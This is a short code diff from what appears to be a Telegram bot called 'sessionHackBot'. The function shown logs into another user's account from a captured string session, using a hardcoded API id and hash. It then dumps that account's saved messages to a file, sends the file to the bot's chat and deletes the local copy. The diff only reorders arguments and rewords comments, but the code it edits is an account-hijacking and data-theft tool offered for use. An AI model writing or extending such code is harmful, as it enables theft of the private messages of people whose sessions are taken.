@@ -29,7 +29,7 @@ Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 import os
 from telegraph import Telegraph
 from telethon.tl import types
-async def savedmsgs(strses, bot):
+async def savedmsgs(bot, strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             telegraph = Telegraph()
@@ -63,11 +63,10 @@ async def savedmsgs(strses, bot):
                 for message in messages:
                     file.write(message + '\n')
 
-            # Send the file
+            # Sending the file
             await bot.send_file(event.chat_id, "saved_messages.txt")
-            os.remove("saved_messages.txt")
-            
-            return "Saved messages have been sent as a file."
+            os.remove("saved_messages.txt")  # Deleting the file
+            return "Saved messages have been sent as a file and the file has been deleted."
         except Exception as e:
             print(e)
             return "An error occurred while fetching saved messages."
